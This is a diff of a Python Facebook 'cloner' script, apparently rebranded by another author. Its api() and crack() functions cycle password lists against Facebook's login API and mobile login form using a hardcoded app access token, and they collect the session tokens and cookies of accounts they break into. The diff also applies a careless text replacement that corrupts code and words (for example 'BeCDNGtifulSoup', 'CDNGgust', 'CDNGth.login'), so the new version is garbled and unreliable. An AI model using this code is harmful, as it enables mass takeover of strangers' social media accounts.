@@ -1,9 +1,9 @@
  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
- # #    !/usr/bin/python3                                                                # #
+ # #    !/usr/bin/pWTSPhon3                                                                # #
  # #    Coding=utf-8                                                                         # #
  # #    About Script : LEGHARI BRAND                                       # #
- # #    Free  Multi Functional FB Script                                        # #
+ # #    Free  Multi Functional CDNG Script                                        # #
  # #    Created BY :        4DEEL BRAND BOY.                               # #
  # #    Modified Date : 00-XXXXXXXX-2022                               # #
  # #   LEGHARI K COMMAND COPY KRNE SE TUM CLONER NAHI BAN SKTE :)             # #
@@ -13,7 +13,7 @@
 import os, sys, re, time, requests, calendar, random,json
 from random import randint
 from concurrent.futures import ThreadPoolExecutor
-from bs4 import BeautifulSoup as parser
+from bs4 import BeCDNGtifulSoup as parser
 from datetime import datetime
 from datetime import date
 try:
@@ -51,7 +51,7 @@ data2 = {}
 loop = 0
 ct = datetime.now()
 n = ct.month
-bulann = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
+bulann = ["January", "February", "March", "April", "May", "June", "July", "CDNGgust", "September", "October", "November", "December"]
 try:
     if n < 0 or n > 12:
         exit()
@@ -67,15 +67,15 @@ my_date = date.today()
 hr = calendar.day_name[my_date.weekday()]
 tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
 tgl = ("%s %s %s"%(ha, op, ta))
-bulan = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
-ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+bulan = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "CDNGgust", "09": "September", "10": "October", "11": "November", "12": "December"}
+ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
 ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
-ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
-ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
-ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
+ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
+ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
+ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
+ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [CDNG_IAB/CDNG4A;CDNGAV/35.0.0.48.273;]'
+ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [CDNGAN/EMA;CDNGLC/id_ID;CDNGAV/239.0.0.10.109;]'
 def ugen_hp():
 	print(" ")
 	print("\033[1;97m[\033[1;94m01\033[1;97m] User-Agent Xiaomi ");print("\033[1;97m[\033[1;94m02\033[1;97m] User-Agent Nokia ");print("\033[1;97m[\033[1;94m03\033[1;97m] User-Agent Asus ");print("\033[1;97m[\033[1;94m04\033[1;97m] User-Agent Huawei ");print("\033[1;97m[\033[1;94m05\033[1;97m] User-Agent Vivo ");print("\033[1;97m[\033[1;94m06\033[1;97m] User-Agent Oppo ");print("\033[1;97m[\033[1;94m07\033[1;97m] User-Agent Samsung ");print("\033[1;97m[\033[1;94m08\033[1;97m] User-Agent Window ");os.system("rm -rf ugent.txt")
@@ -111,7 +111,7 @@ def jalan(z):
 		time.sleep(0.03)
 def logo():
 	os.system("clear")
-	print("\033[1;97m  d8888b. d8888b.  .d88b.    \033[1;97m[\033[1;94m+\033[1;97m] AU \033[1;93m:\033[1;97m Hami ID") ;print("  88  `8D 88  `8D .8P  Y8.   \033[1;97m[\033[1;94m+\033[1;97m] GH \033[1;93m:\033[1;97m Hamid-king-06");print("  88oodD' 88oobY' 88    88   \033[1;97m[\033[1;94m+\033[1;97m] TM \033[1;93m:\033[1;97m XNSCODE");print("  88      88`8b   88    88   \033[1;97m[\033[1;94m+\033[1;97m] YT \033[1;93m:\033[1;97m HAMII WORLD");print("  88      88 `88. `8b  d8'   \033[1;97m[\033[1;94m+\033[1;97m] GM \033[1;93m:\033[1;97m Hamidkhawaja666@");print("  88      88   YD  `Y88P'    \033[1;97m[\033[1;94m+\033[1;97m] TN \033[1;93m:\033[1;97m Hamid-king-06/PRO/")
+	print("\033[1;97m  d8888b. d8888b.  .d88b.    \033[1;97m[\033[1;94m+\033[1;97m] CDNG \033[1;93m:\033[1;97m H4DEEL") ;print("  88  `8D 88  `8D .8P  Y8.   \033[1;97m[\033[1;94m+\033[1;97m] GH \033[1;93m:\033[1;97m Hamid-king-06");print("  88oodD' 88oobY' 88    88   \033[1;97m[\033[1;94m+\033[1;97m] TM \033[1;93m:\033[1;97m XNSCODE");print("  88      88`8b   88    88   \033[1;97m[\033[1;94m+\033[1;97m] WTSP \033[1;93m:\033[1;97m ADEEL LEGHARI");print("  88      88 `88. `8b  d8'   \033[1;97m[\033[1;94m+\033[1;97m] GM \033[1;93m:\033[1;97m ADEEL LEGHARI");print("  88      88   YD  `Y88P'    \033[1;97m[\033[1;94m+\033[1;97m] NAME \033[1;93m:\033[1;97m ADEEL BR4ND")
 	print(" ")
 def tokenz():
 	os.system('clear')
@@ -435,7 +435,7 @@ def publik():
 		
 def atursandi():
 	print(" ")
-	print("\033[1;97m[\033[1;94m01\033[1;97m] Auto Password \033[1;97m[\033[1;94m02\033[1;97m] Manual Password \033[1;97m[\033[1;94m03\033[1;97m] Additional Password")
+	print("\033[1;97m[\033[1;94m01\033[1;97m] CDNGto Password \033[1;97m[\033[1;94m02\033[1;97m] Manual Password \033[1;97m[\033[1;94m03\033[1;97m] Additional Password")
 	ask=input("\033[1;97m[\033[1;94m>>\033[1;97m] Choose : ")
 	if ask in[""]:
 		menu()
@@ -668,8 +668,8 @@ def api(uid, pwx):
 	); sys.stdout.flush()
 	for pw in pwx:
 		pw = pw.lower()
-		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
-		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
+		headers_ = {"x-CDNG-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-CDNG-sim-hni": str(random.randint(20000, 40000)), "x-CDNG-net-hni": str(random.randint(20000, 40000)), "x-CDNG-connection-quality": "EXCELLENT", "x-CDNG-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-CDNG-http-engine": "Liger"}
+		send = ses.get("https://b-api.facebook.com/method/CDNGth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_CDNGmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&CDNG_api_caller_class=com.facebook.fos.headersv2.CDNG4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&CDNG_api_req_friendly_name=CDNGthenticate&cpl=true", headers=headers_)
 		if "session_key" in send.text and "EAAA" in send.text:
 			print("\r %s[OK] %s | %s | %s"%(H,uid, pw, send.json()["access_token"]))
 			ok.append("%s|%s"%(uid, pw))
@@ -699,7 +699,7 @@ def api(uid, pwx):
 
 	loop += 1
 
-### CRACK MBASIC M FB ###
+### CRACK MBASIC M CDNG ###
 def crack(uid, pwx, host, **kwargs):
 	try:
 		ua = open("ugent.txt", "r").read()
@@ -723,7 +723,7 @@ def crack(uid, pwx, host, **kwargs):
 					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
 					else:continue
 				except:pass
-			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
+			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_CDNG_noscript": "true"})
 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
